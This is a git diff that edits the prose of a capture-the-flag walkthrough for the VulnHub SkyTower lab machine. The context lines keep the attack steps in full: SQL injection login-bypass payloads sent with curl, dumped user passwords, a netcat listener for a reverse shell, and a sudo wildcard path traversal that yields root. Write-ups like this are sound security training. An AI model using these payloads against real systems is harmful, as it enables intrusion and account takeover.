@@ -23,7 +23,7 @@ PORT     STATE    SERVICE    VERSION
 |_http-title: ERROR: The requested URL could not be retrieved
 MAC Address: 08:00:27:54:4A:37 (Oracle VirtualBox virtual NIC)
 ```
-So a Squid, a webserver, and ssh. Checking out the website we see this Skytech Login form.
+Looks like a Squid, a webserver, and ssh. Checking out the website we see this Skytech Login form.
 
 ![](pics/1.PNG)
 
@@ -36,7 +36,7 @@ So we try doing the usual login bypasses like ' OR 1=1# and get nothing. Checkin
 curl --data "email=admin&password=' OR 1=1#" http://192.168.56.101/login.php
 There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '11#'' at line 1]
 ```
-So we replace the OR with || instead and it works we get logged in as the user john.
+After awhile we replace the OR with || instead and it works we get logged in as the user john.
 ```
 curl --data "email=admin&password=' || 1=1#" http://192.168.56.101/login.php
 ```
@@ -110,7 +110,7 @@ id      email   password
 2       sara@skytech.com        ihatethisjob
 3       william@skytech.com     senseable
 ```
-Good stuff. So William's password doesn't seem to work, but we login as Sara and get booted as usual. We setup a listener and get a shell like before then notice we can run a couple of commands as root which are configured horribly with wildcard characters.
+Good stuff. William's password doesn't seem to work, but we login as Sara and get booted as usual. We setup a listener and get a shell like before then notice we can run a couple of commands as root which are configured horribly with wildcard characters.
 ```
 root@kali:~# nc -nlvp 443
 listening on [any] 443 ...
@@ -129,7 +129,7 @@ sudo cat /accounts/../../../../../../root/flag.txt
 Congratz, have a cold one to celebrate!
 root password is theskytower
 ```
-Awesome so let's get our root shell then.
+Awesome let's get our root shell then.
 ```
 root@kali:~/machines/skytower# proxychains ssh root@192.168.56.101
 ProxyChains-3.1 (http://proxychains.sf.net)
@@ -147,6 +147,6 @@ Last login: Sun Mar 18 16:30:19 2018 from 192.168.56.101
 root@SkyTower:~# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
-So that was pretty fun, thanks a bunch @telspacesystems for making this one and @VulnHub for the challenges.
+That was a lot of fun, thanks a bunch @telspacesystems for making this one and @VulnHub for all the challenges.
  
 
